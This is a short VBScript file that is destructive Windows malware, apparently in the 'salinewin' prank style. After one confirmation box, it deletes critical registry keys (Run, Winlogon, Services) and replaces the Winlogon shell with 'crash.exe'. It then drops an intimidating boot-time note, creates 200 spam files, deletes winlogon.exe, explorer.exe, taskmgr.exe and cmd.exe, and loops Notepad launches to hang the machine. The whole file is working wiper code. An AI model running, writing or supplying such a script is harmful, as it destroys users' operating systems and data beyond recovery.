Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' === Final Warning ===
answer = MsgBox("THIS WILL DESTROY YOUR VM AND SHOW A MESSAGE ON BOOT. CONTINUE?", 36, "!!! WARNING !!!")
If answer <> 6 Then WScript.Quit

' === Registry Nuking ===
keys = Array( _
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer", _
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", _
    "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon", _
    "HKLM\Software\Microsoft\Windows\CurrentVersion\Run", _
    "HKLM\SYSTEM\CurrentControlSet\Services" _
)
For Each key In keys
    On Error Resume Next
    shell.RegDelete key & "\"
Next

' Break Windows shell (no explorer.exe on boot)
shell.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "crash.exe", "REG_SZ"

' === Drop persistent message file ===
Set msgFile = fso.CreateTextFile("C:\salinewin_note.txt", True)
msgFile.WriteLine "salinewin.exe has claimed this machine."
msgFile.WriteLine "This system is no longer yours."
msgFile.WriteLine "There is no escape."
msgFile.Close

' Make it open on boot
shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\salinewin_note", "notepad.exe C:\salinewin_note.txt", "REG_SZ"

' === Optional File Spam ===
For i = 1 To 200
    On Error Resume Next
    Set spam = fso.CreateTextFile("C:\salinewinisgoat_" & i & ".txt", True)
    spam.WriteLine "YOU WILL NO LONGER HAVE ACCESS TO THIS PC, IT WILL NO LONGER BOOT UP AGAIN"
    spam.Close
Next

' === Destroy essential EXEs ===
Set win = shell.ExpandEnvironmentStrings("%windir%")
On Error Resume Next
fso.DeleteFile(win & "\System32\winlogon.exe")
fso.DeleteFile(win & "\System32\explorer.exe")
fso.DeleteFile(win & "\System32\taskmgr.exe")
fso.DeleteFile(win & "\System32\cmd.exe")

' === RAM spam to hang system ===
Do
    shell.Run "notepad"
Loop
